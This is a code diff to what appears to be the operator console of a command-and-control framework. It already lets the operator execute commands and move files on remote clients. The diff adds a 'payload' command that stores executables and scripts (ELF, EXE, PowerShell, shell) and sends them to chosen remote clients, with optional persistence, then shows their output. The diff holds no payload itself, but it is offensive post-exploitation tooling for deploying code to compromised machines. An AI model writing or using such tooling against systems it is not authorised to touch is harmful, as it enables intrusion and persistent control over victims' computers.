@@ -4,8 +4,10 @@ import base64
 import re
 import subprocess
 import shlex
+import shutil
+from pathlib import Path
 from colorama import Fore, Style
-from .payloads import Payloads
+from .payloads import Payloads, _load_index, _save_index, PAYLOADS_DIR
 
 
 class Functions:
@@ -147,6 +149,38 @@ class Functions:
             return data
         except (json.JSONDecodeError, TypeError) as e:
             print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+            return None
+
+    def send_payload(self, node_id, client_id, name, args_override=None, timeout_override=None, persist_override=None):
+        try:
+            payload_json = Payloads.execute_payload(name, client_id, args_override, timeout_override, persist_override)
+        except (ValueError, FileNotFoundError) as e:
+            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+            return None
+        resp = self.controller.send_to(node_id, payload_json)
+        if not resp:
+            print(f"{Fore.RED}Error: No response from node {node_id}{Style.RESET_ALL}")
+            return None
+        try:
+            data = json.loads(resp)
+            if data.get("status") == "success":
+                client_resp = json.loads(data.get("data", "{}"))
+                if client_resp.get("status") == "success":
+                    stdout = client_resp.get("stdout", "")
+                    stderr = client_resp.get("stderr", "")
+                    rc = client_resp.get("returncode", -1)
+                    if stdout:
+                        print(f"{Fore.GREEN}[stdout]{Style.RESET_ALL}\n{stdout}")
+                    if stderr:
+                        print(f"{Fore.RED}[stderr]{Style.RESET_ALL}\n{stderr}")
+                    print(f"{Fore.YELLOW}[exit code: {rc}]{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}Error from client {client_id}: {client_resp.get('error', 'unknown')}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}Node error: {data.get('message', 'unknown')}{Style.RESET_ALL}")
+            return data
+        except (json.JSONDecodeError, TypeError) as e:
+            print(f"{Fore.RED}Error parsing response: {e}{Style.RESET_ALL}")
             return None
 
 
@@ -371,6 +405,7 @@ class Commands:
             ("exec", "exec <node_id> <client_id> <command>", "Execute a command on a remote client", 3),
             ("download", "download <node_id> <client_id> <path>", "Download a file from a remote client", 3),
             ("upload", "upload <node_id> <client_id> <local_file> <remote_path>", "Upload a file to a remote client", 3),
+            ("payload", "payload <list|send|add|remove> [...]", "Manage and deploy payloads to clients", 3),
         ])
 
         print(
@@ -615,6 +650,84 @@ class Commands:
             self.functions.send_upload(node_id, client_id, remote_path, content)
         except OSError as e:
             print(f"{Fore.RED}Error reading {local_file}: {e}{Style.RESET_ALL}")
+
+    def payload(self, shell, args):
+        if not args:
+            print(f"{Fore.RED}Usage: payload <list|send|add|remove> [params]{Style.RESET_ALL}")
+            return
+        subcmd = args[0].lower()
+        if subcmd == "list":
+            index = _load_index()
+            if not index:
+                print(f"{Fore.YELLOW}No payloads in index{Style.RESET_ALL}")
+                return
+            print(f"\n{Fore.YELLOW}Available payloads:{Style.RESET_ALL}")
+            for name, entry in index.items():
+                ptype = entry.get("type", "bin")
+                timeout = entry.get("timeout", 120)
+                persist = entry.get("persist", False)
+                pfile = entry.get("file", "")
+                print(f"  {name:<20} type={ptype:<5} timeout={timeout:<4} persist={persist:<1} file={pfile}")
+        elif subcmd == "send":
+            if len(args) < 4:
+                print(f"{Fore.RED}Usage: payload send <node_id> <client_id> <name> [timeout] [--persist] [-- args...]{Style.RESET_ALL}")
+                return
+            node_id = args[1]
+            client_id = args[2]
+            name = args[3]
+            timeout_override = None
+            persist_override = None
+            args_override = None
+            rest = args[4:]
+            if rest and rest[0].isdigit():
+                timeout_override = int(rest.pop(0))
+            if rest and rest[0] == "--persist":
+                persist_override = True
+                rest.pop(0)
+            if rest and rest[0] == "--":
+                args_override = rest[1:]
+            self.functions.send_payload(node_id, client_id, name, args_override, timeout_override, persist_override)
+        elif subcmd == "add":
+            if len(args) < 3:
+                print(f"{Fore.RED}Usage: payload add <name> <local_path>{Style.RESET_ALL}")
+                return
+            name = args[1]
+            local_path = Path(args[2])
+            if not local_path.exists():
+                print(f"{Fore.RED}Error: File not found: {local_path}{Style.RESET_ALL}")
+                return
+            index = _load_index()
+            if name in index:
+                confirm = input(f"{Fore.YELLOW}Payload '{name}' already exists. Overwrite? (y/N) > {Style.RESET_ALL}").strip().lower()
+                if confirm not in ("y", "yes"):
+                    print(f"{Fore.YELLOW}Cancelled{Style.RESET_ALL}")
+                    return
+            PAYLOADS_DIR.mkdir(parents=True, exist_ok=True)
+            dest = PAYLOADS_DIR / local_path.name
+            shutil.copy2(str(local_path), str(dest))
+            suffix = local_path.suffix.lower()
+            type_map = {".elf": "elf", ".exe": "exe", ".ps1": "ps1", ".sh": "sh", ".py": "py", ".bin": "bin"}
+            ptype = type_map.get(suffix, "bin")
+            index[name] = {"file": local_path.name, "type": ptype, "timeout": 120, "persist": False, "args": []}
+            _save_index(index)
+            print(f"{Fore.GREEN}Payload '{name}' added ({local_path.name}, type={ptype}){Style.RESET_ALL}")
+        elif subcmd == "remove":
+            if len(args) < 2:
+                print(f"{Fore.RED}Usage: payload remove <name>{Style.RESET_ALL}")
+                return
+            name = args[1]
+            index = _load_index()
+            if name not in index:
+                print(f"{Fore.RED}Error: Payload '{name}' not found{Style.RESET_ALL}")
+                return
+            entry = index.pop(name)
+            _save_index(index)
+            file_path = PAYLOADS_DIR / entry["file"]
+            if file_path.exists():
+                os.remove(str(file_path))
+            print(f"{Fore.GREEN}Payload '{name}' removed{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}Unknown subcommand '{subcmd}'. Use: list, send, add, remove{Style.RESET_ALL}")
 
     def quit(self, shell, args):
         self.controller.shutdown()
